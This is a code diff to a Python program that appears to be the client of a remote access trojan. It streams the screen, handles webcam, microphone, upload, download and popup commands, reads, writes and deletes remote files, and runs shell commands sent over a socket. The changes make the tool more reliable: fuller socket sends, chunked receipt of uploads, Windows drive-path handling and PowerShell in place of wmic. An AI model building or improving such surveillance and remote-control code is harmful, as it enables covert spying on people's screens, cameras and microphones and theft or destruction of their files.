@@ -15,7 +15,13 @@ def install_package(package, import_name=None):
     import_name = import_name or package
     try:
         __import__(import_name)
-    except ImportError:
+    except ImportError as e:
+        if getattr(sys, 'frozen', False):
+            # In a compiled PyInstaller environment, we cannot run pip to install libraries dynamically.
+            # Running subprocess with sys.executable would execute the compiled binary itself recursively, causing an infinite loop.
+            print(f"❌ Error: Required library '{package}' is missing from the compiled bundle: {e}")
+            sys.exit(1)
+        
         print(f"📦 Installing {package}...")
         # Check if Kali/Debian with restricted environment
         if platform.system() == "Linux" and os.path.exists("/usr/bin/apt"):
@@ -25,8 +31,12 @@ def install_package(package, import_name=None):
             except:
                 print(f"⚠️ Try manually: sudo apt install python3-{package.lower()}")
         else:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
-        print(f"✅ {package} installed")
+            try:
+                subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
+                print(f"✅ {package} installed")
+            except Exception as pip_err:
+                print(f"❌ Failed to install {package} via pip: {pip_err}")
+
 
 install_package("Pillow", "PIL")
 install_package("mss")
@@ -427,8 +437,8 @@ def start_screen_stream():
                 if frame_data:
                     payload = frame_data.encode()
                     with client_lock:
-                        client.send(payload)
-                        client.send(b"\n[FRAME_END]\n")
+                        client.sendall(payload)
+                        client.sendall(b"\n[FRAME_END]\n")
                 # Wait 40ms (corresponds to ~25 FPS max)
                 time.sleep(0.04)
             except Exception:
@@ -782,12 +792,18 @@ def get_system_metrics():
             "message": str(e)
         })
 
+def safe_abspath(path):
+    path_strip = path.strip().rstrip("/\\")
+    if len(path_strip) == 2 and path_strip[1] == ":" and path_strip[0].isalpha():
+        return path_strip + "\\"
+    return os.path.abspath(path)
+
 def list_directory_contents(path):
     """List contents of specified path for the visual file manager"""
     try:
         if not path or path == "":
             path = os.getcwd()
-        elif path.upper() == "DRIVES":
+        elif path.upper() in ("DRIVES", "SYSTEM DRIVES"):
             import psutil
             items = []
             for part in psutil.disk_partitions(all=True):
@@ -810,7 +826,7 @@ def list_directory_contents(path):
                 "data": unique_items
             })
         else:
-            path = os.path.abspath(path)
+            path = safe_abspath(path)
 
         items = []
         for entry in os.scandir(path):
@@ -844,7 +860,7 @@ def list_directory_contents(path):
 def delete_remote_file(path):
     """Delete remote file or folder recursively"""
     try:
-        path = os.path.abspath(path)
+        path = safe_abspath(path)
         if not os.path.exists(path):
             raise FileNotFoundError(f"Path not found: {path}")
 
@@ -870,7 +886,7 @@ def delete_remote_file(path):
 def read_text_file(path):
     """Read remote text file safely with size checks, binary detection, and encoding preservation"""
     try:
-        path = os.path.abspath(path)
+        path = safe_abspath(path)
         if not os.path.exists(path):
             raise FileNotFoundError(f"File not found: {path}")
             
@@ -937,7 +953,7 @@ def read_text_file(path):
 def write_text_file(path, encoding, content_b64):
     """Write content back to file using original encoding"""
     try:
-        path = os.path.abspath(path)
+        path = safe_abspath(path)
         # Decode base64 bytes to raw bytes, then decode as utf-8 (which is how we encoded the string on read)
         text_data = base64.b64decode(content_b64).decode("utf-8")
         
@@ -1587,6 +1603,24 @@ def main_loop():
                             return
                         break
                     
+                    # If this is a large command payload, receive all chunks in a loop using a socket timeout
+                    try:
+                        decoded_start = data.decode(errors='ignore')
+                    except Exception:
+                        decoded_start = ""
+                        
+                    if decoded_start.startswith(("UPLOAD:", "WRITE_TEXT_FILE:")):
+                        client.settimeout(0.5)
+                        while True:
+                            try:
+                                chunk = client.recv(65536)
+                                if not chunk:
+                                    break
+                                data += chunk
+                            except socket.timeout:
+                                break
+                        client.settimeout(None)
+                    
                     cmd = data.decode(errors='ignore').strip()
 
                     if cmd.lower() == "exit":
@@ -1985,11 +2019,11 @@ def main_loop():
                             elif cmd_lower.startswith("kill "):
                                 cmd = "taskkill /F /IM " + cmd[4:]  # Linux kill to Windows taskkill
                             elif cmd_lower == "df":
-                                cmd = "wmic logicaldisk get size,freespace,caption"  # Disk info
+                                cmd = 'powershell -Command "Get-CimInstance Win32_LogicalDisk | Select-Object Caption, Size, FreeSpace"'  # Disk info
                             elif cmd_lower == "du":
                                 cmd = "dir /s"  # Directory size
                             elif cmd_lower == "free":
-                                cmd = "wmic OS get TotalVisibleMemorySize,FreePhysicalMemory"  # Memory info
+                                cmd = 'powershell -Command "Get-CimInstance Win32_OperatingSystem | Select-Object TotalVisibleMemorySize, FreePhysicalMemory"'  # Memory info
                             elif cmd_lower == "top":
                                 cmd = "tasklist"  # Process list
                             elif cmd_lower == "nano" or cmd_lower == "vi" or cmd_lower == "vim":
@@ -2091,7 +2125,7 @@ def main_loop():
                                 output = error_msg.encode()
 
                     with client_lock:
-                        client.send(output)
+                        client.sendall(output)
                     
                     if not cmd.upper().startswith(("SCREENSHOT", "DOWNLOAD:", "UPLOAD:",
                                                    "SYSINFO", "POPUP:", "WEBCAM", "MICROPHONE",
